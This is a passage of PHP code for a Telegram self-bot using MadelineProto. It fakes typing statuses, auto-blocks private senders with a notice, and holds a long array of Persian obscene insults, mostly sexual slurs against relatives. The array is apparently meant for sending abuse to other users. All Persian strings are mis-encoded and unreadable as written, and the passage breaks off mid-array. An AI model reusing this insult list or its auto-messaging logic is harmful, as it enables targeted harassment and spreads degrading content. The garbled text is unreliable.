if($data['proactions'] == "on" && $update['_'] == "updateNewChannelMessage"){
        $sendMessageTypingAction = ['_' => 'sendMessageTypingAction'];
        $sendMessageGamePlayAction = ['_' => 'sendMessageGamePlayAction'];
        $sendMessageRecordVideoAction = ['_' => 'sendMessageRecordVideoAction'];
        $sendMessageRecordAudioAction = ['_' => 'sendMessageRecordAudioAction'];
        $sendMessageUploadDocumentAction = ['_' => 'sendMessageUploadDocumentAction'];
        $sendMessageUploadPhotoAction = ['_' => 'sendMessageUploadPhotoAction'];
        $sendMessageGeoLocationAction = ['_' => 'sendMessageGeoLocationAction'];
yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageTypingAction]);
yield $MadelineProto->sleep(1);
yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageGamePlayAction]);
yield $MadelineProto->sleep(1);
yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageGeoLocationAction]);
yield $MadelineProto->sleep(1);
yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageRecordVideoAction]);
yield $MadelineProto->sleep(1);
yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageRecordAudioAction]);
yield $MadelineProto->sleep(1);
yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageUploadDocumentAction]);
yield $MadelineProto->sleep(1);
yield $MadelineProto->messages->setTyping(['peer' => $peer, 'action' => $sendMessageUploadPhotoAction]);
yield $MadelineProto->sleep(1);
    }
if($type3 == 'user'){
if($text == $text and $data['lockpv'] == "on"){
     yield $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => "Ø¯Ø± Ø­Ø§Ù Ø­Ø§Ø¶Ø± Ù¾ÛÙÛÙ ÙÙÙÙ ð Ù Ø¨Ù ÙÙÛÙ Ø¯ÙÛÙ Ø´ÙØ§ Ø¨ÙØ§Ú© ÙÛØ´ÛØ¯Ø Ø¯Ø± ØµÙØ±Øª ØªÙØ§ÛÙ ØµØ§Ø­Ø¨ Ø§Ú©Ø§ÙØª Ø´ÙØ§ Ø±ÙØ¹ Ø¨ÙØ§Ú© Ø®ÙØ§ÙÛØ¯ Ø´Ø¯ðð¤"]);
     yield $MadelineProto->messages->sendMessage(['peer' => $para, 'message' => "Ø³Ø±ÙØ±ÙðØ Ú©Ø§Ø±Ø¨Ø± $peer Ø¨Ù Ø¯ÙÛÙ ÙØ¹Ø§Ù Ø¨ÙØ¯Ù Ø­Ø§ÙØª ÙÙÙ Ù¾ÛÙÛ Ù ÙØ²Ø§Ø­ÙØª Ø¯Ø± Ø³Ø§Ø¹Øª Ø®Ø§Øµðð Ø¨ÙØ§Ú© Ø´Ø¯"]);

      yield $MadelineProto->contacts->block(['id' => $peer]);
          }
}
       if(strpos($text, 'ð') !== false and $data['poker'] == "on") {
           $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'ððð', 'reply_to_msg_id' => $message['id']]);
       }
       if(strpos($text, 'ð') !== false and $data['funny'] == "on") {
           $MadelineProto->messages->sendMessage(['peer' => $peer, 'message' => 'ð¤£ðð¤£', 'reply_to_msg_id' => $message['id']]);
       }
       
  $fohsh = [
  "Ú¯Øµ Ú©Ø´","Ú©Ø³ ÙÙÙ","Ú©Øµ ÙÙØª","Ú©Ø³ Ø®ÙØ§ÙØ±","Ú©Ø³ Ø®ÙØ§Ø±","Ú©Ø³ Ø®Ø§Ø±Øª","Ú©Ø³ Ø§Ø¨Ø¬ÛØª","Ú©Øµ ÙÛØ³","Ø³Ø§Ú© Ø¨Ø²Ù","Ø³Ø§Ú© ÙØ¬ÙØ³Û","ÙÙÙ Ø§ÙÚ©Ø³ÛØ³","ÙÙ Ø§ÙÚ©Ø³ÛØ³","ÙØ§ÙÙØ³ØªÙ Ú¯Ø§ÛÛØ¯Ù","ÙÙÙ Ø²ÙØ§","Ú©Ø³ Ø®Ù","Ú©Ø³ ÙØ®","Ú©Ø³ ÙØºØ²","Ú©Ø³ ÙØºØ°","Ø®ÙØ§Ø±Ú©Ø³","Ø®ÙØ§Ø± Ú©Ø³","Ø®ÙØ§ÙØ±Ú©Ø³","Ø®ÙØ§ÙØ± Ú©Ø³","Ø­Ø±ÙÙ Ø²Ø§Ø¯Ù","Ø­Ø±ÙÙØ²Ø§Ø¯Ù","Ø®Ø§Ø± Ú©Ø³","ØªØ®Ù Ø³Ú¯","Ù¾Ø¯Ø± Ø³Ú¯","Ù¾Ø¯Ø±Ø³Ú¯","Ù¾Ø¯Ø± ØµÚ¯","Ù¾Ø¯Ø±ØµÚ¯","ÙÙÙ Ø³Ú¯","ÙÙ Ø³Ú¯","ÙÙ ØµÚ¯","ÙÙÙ ØµÚ¯","ÙÙÙ Ø®Ø±Ø§Ø¨","ØªØ®Ø®Ø®Ø®Ø®Ø®Ø®Ø®Ø®","ÙÙ Ø®Ø±Ø§Ø¨","ÙØ§Ø¯Ø± Ø³Ú¯","ÙØ§Ø¯Ø± Ø®Ø±Ø§Ø¨","ÙØ§Ø¯Ø±ØªÙ Ú¯Ø§ÛÛØ¯Ù","ØªØ®Ù Ø¬Ù","ØªØ®Ù Ø³Ú¯","ÙØ§Ø¯Ø±ØªÙ Ú¯Ø§ÛÛØ¯Ù","ÙÙÙ Ø­ÙÙÙÛ","ÙÙ Ø­ÙÙÙÛ","ÙÙ Ú¯Ø´Ø§Ø¯","ÙÙÙ Ú¯Ø´Ø§Ø¯","ÙÙ Ø®Ø§ÛÙ Ø®ÙØ±","ØªØ®Ø®Ø®Ø®Ø®Ø®Ø®Ø®Ø®","ÙÙ ÙÙÙ","Ú©Ø³ Ø¹ÙØª","Ú©Ø³ Ú©Ø´","Ú©Ø³ Ø¨ÛØ¨ÛØª","Ú©Øµ Ø¹ÙØª","Ú©Øµ Ø®Ø§ÙØª","Ú©Ø³ Ø¨Ø§Ø¨Ø§","Ú©Ø³ Ø®Ø±","Ú©Ø³ Ú©ÙÙ","Ú©Ø³ ÙØ§ÙÛØª","Ú©Ø³ ÙØ§Ø¯Ø±Ù","ÙØ§Ø¯Ø± Ú©Ø³Ø¯Ù","Ø®ÙØ§Ø± Ú©Ø³Ø¯Ù","ØªØ®Ø®Ø®Ø®Ø®Ø®Ø®Ø®Ø®","ÙÙÙ Ú©Ø³","Ø¨ÛÙØ§ÙÙØ³","Ø¨Û ÙØ§ÙÙØ³","Ø´Ù ÙØ§ÙÙØ³","Ø³Ú¯ ÙØ§ÙÙØ³","ÙÙÙ Ø¬ÙØ¯ØªÙ Ú¯Ø§ÛÛØ¯Ù Ø¨Ø§Ù ","ÚÚÚÚ ÙÚ¯Ø§ÛÛØ¯Ù Ø³ÛÚ© Ú©Ù Ù¾ÙÛØ² D:","ÙÙÙ Ø­ÙÙÙÛ","ÚÚÚÚÚÚÚ","ÙØ² ÙÙØ¹","ÙÙÙ Ø§ÙÚ©Ø³ÛØ³","Ú©Øµ ÙÙØª","Ø¨Ø§ÙØ§ Ø¨Ø§Ø´","ÙÙØª Ø±Ù ÙÛÚ¯Ø§Ù","Ú©ÛØ±Ù Ø§Ø² Ù¾ÙÙØ§ ØªÙ Ú©Øµ ÙÙØª","ÙØ§Ø¯Ø± Ú©ÛØ± Ø¯Ø²Ø¯","ÙÙØ¹ Ø­Ø±ÙÙÛ","ØªÙÙÙ ØªÙ Ú©Øµ ÙÙØª","Ú©ÛØ± ØªÚ© ØªÚ© Ø¨Ú©Ø³ ØªÙØ¹ Ú¯ÙØ¯ ØªÙ Ú©Øµ ÙÙØª","Ú©Øµ Ø®ÙØ§Ø± Ø¨Ø¯Ø®ÙØ§Ù","Ø®ÙØ§Ø± Ú©ØµØ¯Ù","ÙÙØ¹ Ø¨Ø§Ø·Ù","Ø­Ø±ÙÙ ÙÙÙØ¹","ÙÙÙ Ø³Ú¯ ÙØ§ÙÙØ³","ÙÙÙ ÙÙØª Ø´ÙØ§ ÙÙÙ ÚÚÚÚ","ÙÙÙ Ú©ÛØ± ÙØ§Ù¾ Ø²Ù","ÙÙØ¹ Ø§ÙØ¨Û","ÙÙÙ Ú©ÛØ± Ø¯Ø²Ø¯","ÙÙÙ Ú©ÛÙÙÛ","ÙÙÙ Ú©ØµÙ¾Ø§Ø±Ù","Ø²ÙØ§ Ø²Ø§Ø¯Ø¹","Ú©ÛØ± Ø³Ú¯ ØªÙ Ú©Øµ ÙØªØª Ù¾Ø®Ø®Ø®","ÙÙØ¯ Ø²ÙØ§","ÙÙÙ Ø®ÛØ§Ø¨ÙÙÛ","ÙÛØ³ Ø¨Ø¹ Ú©Ø³ Ø­Ø³Ø§Ø³ÛØª Ø¯Ø§Ø±Ù","Ú©Øµ ÙÚ¯Ù ÙÙÙ Ø³Ú¯ Ú©Ù ÙÛÚ©ÙÙØªØªØ§Ø§Ø§Ø§","Ú©Øµ ÙÙ Ø¬ÙØ¯Øª","ÙÙÙ Ø³Ú¯","ÙÙÙ Ú©ÙÙÛ","ÙÙÙ Ø²ÛØ±Ø§Ø¨Û","Ø¨Ú©Ù ÙÙØªÙ","ÙÙØ¹ ÙØ§Ø³Ø¯","ÙÙÙ Ø³Ø§Ú©Ø±","Ú©Ø³ ÙÙØ¹ Ø¨Ø¯Ø®ÙØ§Ù","ÙÚ¯Ø§ÛÛØ¯Ù","ÙØ§Ø¯Ø± Ø³Ú¯","ÙÙØ¹ Ø´Ø±Ø·Û","Ú¯Û ÙÙØ¹","Ø¨Ø§Ø¨Ø§Øª Ø´Ø§Ø´ÛØ¯ØªØª ÚÚÚÚÚÚ","ÙÙÙ ÙØ§ÙØ±","Ø­Ø±ÙÙØ²Ø§Ø¯Ù","ÙÙÙ Ú©Øµ","Ú©Øµ ÙÙØª Ø¨Ø§Ù","Ù¾Ø¯Ø± Ø³Ú¯","Ø³ÛÚ© Ú©Ù Ú©Øµ ÙÙØª ÙØ¨ÛÙÙØª","Ú©ÙÙØ¯Ù","ÙÙÙ ÙÙÙ","ÙÙÙ Ø³Ú¯","ÙØ§Ø¯Ø± Ø¬ÙØ¯Ù","Ú©Øµ Ú©Ù¾Ú© Ø²Ø¯Ø¹","ÙÙØ¹ ÙÙÚ¯Û","ÙÙÙ Ø®ÛØ±Ø§ØªÛ","Ø³Ø¬Ø¯Ù Ú©Ù Ø³Ú¯ ÙÙØ¹","ÙÙÙ Ø®ÛØ§Ø¨ÙÙÛ","ÙÙÙ Ú©Ø§Ø±ØªÙÙÛ","ØªÚ©Ø±Ø§Ø± ÙÛÚ©ÙÙ Ú©Øµ ÙÙØª","ØªÙÚ¯Ø±Ø§Ù ØªÙ Ú©Ø³ ÙÙØª","Ú©Øµ Ø®ÙØ§Ø±Øª","Ø®ÙØ§Ø± Ú©ÛÙÙÛ","Ù¾Ø§ Ø¨Ø²Ù ÚÚÚÚÚ","ÙØ§Ø¯Ø±ØªÙ Ú¯Ø§ÛÛØ¯Ù","Ú¯ÙØ² ÙÙØ¹","Ú©ÛØ±Ù ØªÙ Ø¯ÙÙ ÙÙØª","ÙÙØ¹ ÙÙÚ¯Ø§ÙÛ","Ú©ÛØ±Ù ØªÙ Ú©Øµ Ø²ÛØ¯Øª","Ú©ÛØ± ØªÙ ÙÙÙØ§Û Ø§Ø¨Ø¬ÛØª","Ø§Ø¨Ø¬Û Ø³Ú¯","Ú©Ø³ Ø¯Ø³Øª Ø±ÛØ¯Û Ø¨Ø§ ØªØ§ÛÙ¾ Ú©Ø±Ø¯ÙØª ÚÚÚ","Ø§Ø¨Ø¬Û Ø¬ÙØ¯Ù","ÙÙØ¹ Ø³Ú¯ Ø³ÛØ¨ÛÙ","Ø¨Ø¯Ù Ø¨Ú©ÙÛÙ ÚÚÚÚ","Ú©Øµ ÙØ§ÙÙØ³","Ø´Ù ÙØ§ÙÙØ³","Ø±ÛØ¯Ù Ù¾Ø³ Ú©ÙØª ÚÚÚÚÚ","ÙÙÙ Ø´Ù","ÙÙØ¹ ÙØ³Ø·Û","ÙÙÙ ÙÙ","Ø¯Ø³Øª Ù Ù¾Ø§ ÙØ²Ù Ú©Ø³ ÙÙØ¹","ÙÙÙ ÙÙÙ","Ø®ÙØ§Ø±ØªÙ Ú¯Ø§ÛÛØ¯Ù","ÙØ­ÙÛ!Ø","ÙÙØª Ø®ÙØ¨Ø¹!Ø","Ú©Ø³ Ø²ÙØª","Ø´Ø§Ø´ ÙÙØ¹","ÙÙÙ Ø­ÛØ§Ø·Û /:","ÙÙ ØºØ³ÙÛ","Ú©ÛØ±Ù ØªÙ Ú©Ø³ ÙÙØª Ø¨Ú¯Ù ÙØ±Ø³Û ÚÚÚÚ","Ø§Ø¨Ù ØªÙ Ú©Øµ ÙÙØª :/","ÙØ§Ú© ÛÙØ± ÙØ§Ø¯Ø± Ø®ÙØ§Ø± Ø³Ú¯ Ù¾Ø®Ø®Ø®","Ú©ÛØ± Ø³Ú¯ ØªÙ Ú©Øµ ÙÙØª","Ú©Øµ Ø²Ù","ÙÙÙ ÙØ±Ø§Ø±Û","Ø¨Ú©Ù ÙÙØªÙ ÙÙ Ø¨Ø§Ù Ø¬ÙØ¹ Ú©Ù ÙÙÙ Ø¬ÙØ¯Ù /:::","ÙÙÙ Ø¬ÙØ¯Ù Ø¨ÛØ§ ÙØ§Ø³Ù Ø³Ø§Ú© Ø¨Ø²Ù","Ø­Ø±Ù ÙØ²Ù Ú©Ù ÙÚ©ÙÙØª ÙØ§Ø§Ø§ :|","Ú©ÛØ± ØªÙ Ú©Øµ ÙÙØªð","Ú©Øµ Ú©Øµ Ú©Øµ ÙÙØªð","Ú©ØµØµØµØµ ÙÙØª Ø¬ÙÙÙÙ","Ø³Ú¯ ÙÙØ¹","Ú©Øµ Ø®ÙØ§Ø±Øª","Ú©ÛØ±Û ÙÛØ³","Ú©ÙØ¹ Ú©ÛØ±Û","ØªÛØ² Ø¨Ø§Ø´ Ø³ÛÚ© Ú©Ù ÙØ¨ÛÙÙØª","ÙÙØ¬ ØªÛØ² Ø¨Ø§Ø´ ÚÚÚ","Ø¨ÛØ§ ÙÙØªÙ Ø¨Ø¨Ø±","Ø¨Ú©Ù ÙÙØªÙ Ø¨Ø§Ù ","Ú©ÛØ±Ù ØªÙ Ø¨Ø¯Ø®ÙØ§Ù","ÚÚÚÚÚÚÚ","ÙÙÙ Ø¬ÙØ¯Ù","ÙÙÙ Ú©Øµ Ø·ÙØ§","ÙÙÙ Ú©ÙÙ Ø·ÙØ§","Ú©Ø³ ÙÙØª Ø¨Ø²Ø§Ø±Ù Ø¨Ø®ÙØ¯ÛÙ!Ø","Ú©ÛØ±Ù Ø¯ÙÙØª","ÙØ§Ø¯Ø± Ø®Ø±Ø§Ø¨","ÙÙÙ Ú©ÙÙÛ","ÙØ± ÚÛ Ú¯ÙØªÛ ØªÙ Ú©Øµ ÙÙØª Ø®Ø®Ø®Ø®Ø®Ø®Ø®","Ú©Øµ ÙØ§ÙÙØ³Øª Ø¨Ø§Û","Ú©Øµ ÙÙØª Ø¨Ø§Û ://","Ú©Øµ ÙØ§ÙÙØ³Øª Ø¨Ø§Ø¹Û ØªØ®Ø®Ø®Ø®Ø®","Ú©ÙÙ Ú¯ÙØ§Ø¨Û!","Ø±ÛØ¯Û Ø¢Ø¨ ÙØ·Ø¹","Ú©Øµ Ú©Ù ÙÙØªÙ Ú©Ø¹","ÙÙ Ú©ÙÙÛ","ÙÙ Ø®ÙØ´ÙØ²Ù","ÙÙÙ ÙÙØ³"," ÙÙ ÛÙ ÚØ´Ù ","ÙÙÙ ÚØ§ÙØ§Ù","ÙÙÙ Ø¬ÛÙØ¯Ù","ÙÙÙ Ø­Ø±ØµÛ ","ÙÙ ÙØ´Û","ÙÙÙ Ø³Ø§Ú©Ø±","ÙÙ ØªØ®ÙÛ","ÙÙÙ Ø¨Û ÙÙÛØª","ÙÙ Ú©Ø³","ÙÙ Ø³Ú©Ø³Û","ÙÙ ÙØ±Ø§Ø±Û","ÙØ´ ÙÙÙ","Ø³Ú¯ ÙÙÙ","Ø´Ù ÙÙÙ","ÙÙÙ ØªØ®ÙÛ","ÙÙÙ ØªÙÙÙÛ","ÙÙÙ Ú©ÙÙÙ","ÙÙ Ø®Ø´Ú¯Ù","ÙÙ Ø¬ÙØ¯Ù","ÙÙ ÙÙ ","ÙÙ Ø³Ú©Ø³Û","ÙÙ ÙØ´","Ú©Ø³ ÙÙ ","ÙÙ Ú©ÙÙ","ÙÙ Ø±Ø§ÛÚ¯Ø§Ù","ÙÙ Ø®Ø§Ø±Ø¯Ø§Ø±","ÙÙÙ Ú©ÛØ± Ø³ÙØ§Ø±","ÙÙ Ù¾ÙÛÙØ²","ÙÙ ÙØ­ÙÛ","ÙÙÙ Ø¨Ú¯Ø§ÛÛ","ÙÙÙ Ø¨ÙØ¨Û","ÙÙÙ Ø§ÙÚ©Ø³ÛØ³","ÙÙ Ø®ÛØ§Ø¨ÙÙÛ","ÙÙ Ø¹ÙÛ","ÙÙ Ø³Ø§Ù¾ÙØ±ØªÛ","ÙÙ ÙØ§Ø´Ø®ÙØ±","ÙÙÙ Ø·ÙØ§","ÙÙÙ Ø¹ÙÙÙÛ","ÙÙÙ ÙØ± Ø¬Ø§ÛÛ","ÙÙ Ø¯ÛÙØ«","ØªØ®Ø®Ø®Ø®Ø®Ø®Ø®Ø®Ø®","ÙÙ Ø±ÛØ¯ÙÛ","ÙÙ Ø¨Û ÙØ¬ÙØ¯","ÙÙÙ Ø³ÛÚ©Û","ÙÙÙ Ú©ÛÛØ±","ÙÙ Ú¯Ø´Ø§Ø¯","ÙÙ Ù¾ÙÙÛ","ÙÙ ÙÙ","ÙÙ ÙØ±Ø²Ù","ÙÙ Ø¯ÙØ§ØªÛ","ÙÙÙ ÙÛÙØ¯ÙØ²Û","ÙÙ ØªØ§ÛÙ¾Û","ÙÙ Ø¨Ø±ÙÛ","ÙÙ Ø´Ø§Ø´Û","ÙÙÙ Ø¯Ø±Ø§Ø²Û","Ø´Ù ÙÙØ¹","ÛÚ©Ù ÙÙØªÙ Ú©Ù","Ú©Ø³ Ø®ÙØ§Ø± Ø¨Ø¯Ø®ÙØ§Ù","Ø¢Ø¨ ÚØ§ÙØ§Ù","ÙÙÙ Ø¬Ø±ÛØ¯Ù","ÙÙÙ Ø³Ú¯ Ø³ÙÛØ¯","Ø¢Ø¨ Ú©ÙÙ","ÙÙÙ 85","ÙÙÙ Ø³ÙÙ¾Ø±Û","Ø¨Ø®ÙØ±Ø´","Ú©Ø³ Ù","Ø®ÙØ§Ø±ØªÙ Ú¯Ø§ÛÛØ¯Ù","Ø®Ø§Ø±Ú©Ø³Ø¯Ù","Ú¯Û Ù¾Ø¯Ø±","Ø¢Ø¨ ÚØ§ÙØ§Ù","Ø²ÙØ§ Ø²Ø§Ø¯Ù","Ø²Ù Ø¬ÙØ¯Ù","Ø³Ú¯ Ù¾Ø¯Ø±","ÙØ§Ø¯Ø± Ø¬ÙØ¯Ù","ÙÙØ¹ Ú©ÛØ± Ø®ÙØ±","ÚÚÚÚÚ","ØªÛØ² Ø¨Ø§ÙØ§","ÙÙÙ Ø³Ú¯Ù Ø¨Ø§ Ú©Ø³Ø´Ø± Ø¯Ø± ÙÛØ±Ù","Ú©ÛØ± Ø³Ú¯ ØªÙ Ú©Øµ ÙÙØª","kos kesh","kir","kiri","nane lashi","kos","kharet","blis kirmo","Ø¯ÙØ§ØªÛ","Ú©ÛØ±Ù ÙØ§ Ú©Øµ Ø®Ø§Ø±Øª","Ú©ÛØ±Û","ÙÙÙ ÙØ§Ø´Û","ÙÙÙ","Ú©Øµ","Ú©ÛØ±","Ø¨Û Ø®Ø§ÛÙ","ÙÙÙ ÙØ´","Ø¨Û Ù¾Ø¯Ø±ÙØ§Ø¯Ø±","Ø®Ø§Ø±Ú©ØµØ¯Ù","ÙØ§Ø¯Ø± Ø¬ÙØ¯Ù","Ú©ØµÚ©Ø´","Ú©ÛØ±Ù Ú©ÙÙ ÙØ§Ø¯Ø±Øªðððð","Ø¨Ø§ÙØ§ Ø¨Ø§Ø´ Ú©ÛØ±Ù Ú©Øµ ÙØ§Ø¯Ø±Øªððð","ÙØ§Ø¯Ø±ØªÙ ÙÛÚ¯Ø§Ù ÙÙÚÙ Ø¬ÙÙ Ø¨Ø§ÙØ§ððð","Ø§Ø¨ Ø®Ø§Ø±Ú©ØµØªÙ ØªÙØ¯ ØªÙØ¯ ØªØ§ÛÙ¾ Ú©Ù Ø¨Ø¨ÛÙÙ","ÙØ§Ø¯Ø±ØªÙ ÙÛÚ¯Ø§Ù Ø¨Ø®Ø§Û ÙØ±Ø§Ø± Ú©ÙÛ","ÙØ§Ù Ø´Ù Ø¯ÛÚ¯Ù ÙÙÚÙ","ÙØ§Ø¯Ø±ØªÙ ÙÛÚ¯Ø§Ù Ø§Ù Ø¨Ø´Û","Ú©ÛØ±Ù Ú©ÙÙ ÙØ§Ø¯Ø±Øª","Ú©ÛØ±Ù Ú©Øµ ÙØµ ÙØ§Ø¯Ø±Øª Ø¨Ø§ÙØ§","Ú©ÛØ±Ù ØªÙ ÚØ´Ù ÚØ§Ù ÙØ§Ø¯Ø±Øª","Ú©ÙÙ ÙØ§Ø¯Ø±ØªÙ ÙÛÚ¯Ø§Ù Ø¨Ø§ÙØ§","Ø¨ÛÙØ§ÙÙØ³  Ø®Ø³ØªÙ Ø´Ø¯ÛØ","ÙØ¨ÛÙÙ Ø®Ø³ØªÙ Ø¨Ø´Û Ø¨ÛÙØ§ÙÙØ³","ÙÙØªÙ ÙÛÚ©ÙÙ","Ú©ÛØ±Ù Ú©ÙÙ ÙØ§Ø¯Ø±Øª ððððððð","ØµÙÙ ØªÙ Ú©ØµÙÙØª Ø¨Ø§ÙØ§","Ø¨ÛÙØ§ÙÙØ³ Ø¨Ø§ÙØ§ Ø¨Ø§Ø´ Ø¨ÙØª ÙÛÚ¯Ù","Ú©ÛØ± ØªÙ ÙØ§Ø¯Ø±Øª","Ú©Øµ ÙØµ ÙØ§Ø¯Ø±ØªÙ Ø¨ÙÛØ³ÙØ","Ú©Øµ ÙØ§Ø¯Ø±ØªÙ ÚÙÚ¯ Ø¨Ø²ÙÙØ","Ø¨Ù Ø®Ø¯Ø§ Ú©ØµÙÙØª Ø¨Ø§ÙØ§ ","ÙØ§Ø¯Ø±ØªÙ ÙÛÚ¯Ø§Ù ","Ú©ÛØ±Ù Ú©ÙÙ ÙØ§Ø¯Ø±Øª Ø¨ÛÙØ§ÙÙØ³","ÙØ§Ø¯Ø±Ø¬ÙØ¯Ù Ø¨Ø§ÙØ§ Ø¨Ø§Ø´","Ø¨ÛÙØ§ÙÙØ³ ØªØ§ Ú©Û ÙÛØ®Ø§Û Ø³Ø·Ø­Øª Ú¯Ø­ Ø¨Ø§Ø´Ù","Ø§Ù¾Ø¯ÛØª Ø´Ù Ø¨ÛÙØ§ÙÙØ³ Ø®Ø² Ø¨ÙØ¯","Ø§Û ØªÙØ±Ú© Ø®Ø± Ø¨Ø§ÙØ§ Ø¨Ø¨ÛÙÙ","Ù Ø§ÙØ§ ØªÙ Ø¨ÛÙØ§ÙÙØ³ ÚÙÙØ´","ØªÙ ÛÚ©ÛÙ ÙØ§Ø¯Ø±ØªÙ ÙÛÚ©ÙÙ","Ú©ÛØ±Ù ØªÙ ÙØ§ÙÙØµØª ","Ú©ÛØ± ØªÙ ÙÙØª","Ø±ÛØ´ Ø±ÙØ­Ø§ÙÛ ØªÙ ÙÙØª","Ú©ÛØ± ØªÙ ÙØ§Ø¯Ø±Øªððð","Ú©Øµ ÙØ§Ø¯Ø±ØªÙ ÙØ¬Ø± Ø¨Ø¯Ù","ØµÙÙ ØªÙ ÙÙØª","Ø¨Ø§Øª ØªÙ ÙÙØª ","ÙØ§ÙØ§ÙØªÙ ÙÛÚ©ÙÙ Ø¨Ø§ÙØ§","ÙØ§Û Ø§ÛÙ ØªÙØ±Ú© Ø®Ø±Ù","Ø³Ø·Ø­Ø´Ù ÙÚ¯Ø§","ØªØ§ÛÙ¾ Ú©Ù Ø¨ÛÙØ§ÙÙØ³","Ø®Ø´Ø§Ø¨Ø","Ú©ÛØ±Ù Ú©ÙÙ ÙØ§Ø¯Ø±Øª Ø¨Ø§ÙØ§","Ø¨ÛÙØ§ÙÙØ³ ÙØ¨ÛÙÙ Ø®Ø³ØªÙ Ø¨Ø´Û","ÙØ§Ø¯Ø±ØªÙ Ø¨Ú¯Ø§ÙØ","Ú¯Ø­ ØªÙ Ø³Ø·Ø­Øª Ø´Ø±ÙØª Ø±Ù","Ø¨ÛÙØ§ÙÙØ³ Ø´Ø±ÙØªÙ ÙØ§Ø¨ÙØ¯ Ú©Ø±Ø¯Ù ÛÙ Ú©Ø§Ø±Û Ú©Ù","ÙØ§Û Ú©ÛØ±Ù ØªÙ Ø³Ø·Ø­Øª","Ø¨ÛÙØ§ÙÙØ³ Ø±ÙØ§ÙÛ Ø´Ø¯Û","Ø±ÙØ§ÙÛØª Ú©Ø±Ø¯ÙØ§","ÙØ§Ø¯Ø±ØªÙ Ú©Ø±Ø¯Ù Ú©Ø§Ø±Û Ú©Ù","ØªØ§ÛÙ¾ ØªÙ ÙÙØª","Ø¨ÛÙ¾Ø¯Ø± Ø¨Ø§ÙØ§ Ø¨Ø§Ø´","Ù Ø§ÙØ§ ØªÙ ÙØ± Ø®Ø±","ÙÙØªÙ ÙÛÚ©ÙÙ Ø¨Ø§ÙØ§ Ø¨Ø§Ø´","Ú©ÛØ±Ù ÙØ¨ ÙØ§Ø¯Ø±Øª Ø¨Ø§ÙØ§ððð","ÚØ·ÙØ±Ù Ø¨Ø²ÙÙ ÙØµÙØªÙ Ú¯Ø­ Ú©ÙÙ","Ø¯Ø§Ø±Û ØªØ¸Ø§ÙØ± ÙÛÚ©ÙÛ Ø§Ø±ÙÙÛ ÙÙÛ ÙØ§Ø¯Ø±ØªÙ Ú©ÙØµ Ú©Ø±Ø¯Ù","ÙØ§Ø¯Ø±ØªÙ Ú©Ø±Ø¯Ù Ø¨ÛØºÛØ±Øª","ÙØ±Ø²Ù","ÙØ§Û Ø®Ø¯Ø§Û ÙÙ Ø§ÛÙÙ ÙÚ¯Ø§","Ú©ÛØ± ØªÙ Ú©ØµÙÙØª","ÙÙØªÙ Ø¨ÙÛØ³Ù","ÙÙÙ ÙÚ¯Ø§ Ø¨ÛÙØ§ÙÙØ³","Ú©ÛØ± ØªÙ ÙÙØª Ø¨Ø³Ù Ø¯ÛÚ¯Ù","Ø®Ø³ØªÙ Ø´Ø¯ÛØ","ÙÙØªÙ ÙÛÚ©ÙÙ Ø®Ø³ØªÙ Ø¨Ø´Û","ÙØ§Û Ø¯ÙÙ Ú©ÙÙ ÙØ§Ø¯Ø±Øª Ø¨Ú¯Ø§Ù","Ø§Ù Ø´Ù Ø§Ø­ÙÙ","Ø¨ÛØ´Ø±Ù Ø§Ù Ø´Ù Ø¨ÙØª ÙÛÚ¯Ù","ÙØ§ÙØ§Ù Ø¬ÙØ¯Ù Ø§Ù Ø´Ù","Ú©Øµ ÙØ§ÙØ§ÙØª Ø§Ù Ø´Ù","Ú©Øµ ÙØ´ ÙØ§ ÙÙ Ú©Ù Ø§ÛÙØ¬ÙØ±Û Ø¨Ú¯ÙØ","Ø§Û Ø¨ÛÙØ§ÙÙØ³ ÚÙÙØ´","Ø®Ø§Ø±Ú©ÙØµØªÙ Ø§Û ÙØ§","ÙØ§ÙØ§ÙØªÙ ÙÛÚ©ÙÙ Ø§Ù ÙØ´Û","Ú¯Ø­ ØªÙ ÙÙØª","Ø³Ø·Ø­ ÛÙ Ú¯Ø­ ØµÙØªÙ","Ú¯Ø­ Ú©Ø±Ø¯Ù ØªÙ ÙØµÙØªØ§","ÚÙ Ø±ÙÛÛ Ø¯Ø§Ø±Û Ø¨ÛÙØ§ÙÙØ³","ÙØ§ÙÙØ³ØªÙ Ú©Ø±Ø¯Ù","Ø±Ù Ú©Øµ ÙØ§Ø¯Ø±Øª Ú©ÛØ± Ú©ÙÙØððð","ÙÙÚÙ Ø¨Ø§ÙØ§","Ú©ÛØ±Ù ØªÙ ÙØ§ÙÙØµØªØ§Ø§ðð","ÛØ§ ÙØ§Ø¯Ø±ØªÙ ÙÛÚ¯Ø§Ù ÛØ§ Ø§Ù ÙÛØ´Û","ÙØ§ÙØ´Ù Ø¯ÛÚ¯Ù","Ø¨ÛÙØ§ÙÙØ³","ÙØ§Ø¯Ø±Ú©ØµØªÙ","ÙØ§ÙÙØµ Ú©ØµØ¯Ù","ÙØ§Û Ø¨Ø¯Ù Ø¨Ø¨ÛÙÙ ÙÛØ±Ø³Û","Ú©ÛØ±Ù Ú©ÙÙ ÙØ§Ø¯Ø±Øª ÚÛÚ©Ø§Ø± ÙÛÚ©ÙÛ Ø§Ø®Ù","Ø®Ø§Ø±Ú©ØµØªÙ Ø¨Ø§ÙØ§ Ø¯ÛÚ¯Ù Ø¹Ù","Ú©ÛØ±Ù Ú©ØµÙØ§Ø¯Ø±Øªððð","Ú©ÛØ±Ù Ú©ÙÙ ÙØ§ÙÙØµØ¯ððð","Ø¨ÛÙØ§ÙÙØ³ ÙÙ Ø®ÙØ¯Ù Ø®Ø³ØªÙ Ø´Ø¯Ù ØªÙÚÛØ","Ø§Û Ø´Ø±Ù ÙØ¯Ø§Ø±","ÙØ§ÙØ§ÙØªÙ Ú©Ø±Ø¯Ù Ø¨ÛØºÛØ±Øª","Ù Ø§ÙØ§ ÙØ§Ø¯Ø± Ø¬ÙØ¯Øª","ØªÙ ÛÚ©Û Ø²ÛØ± Ø¨Ø§Ø´","Ø§Ù Ø´Ù","Ø®Ø§Ø±ØªÙ Ú©ÙØµ ÙÛÚ©ÙÙ","Ú©ÙØµÙØ§ÙÙØµØ¯","ÙØ§ÙÙØµ 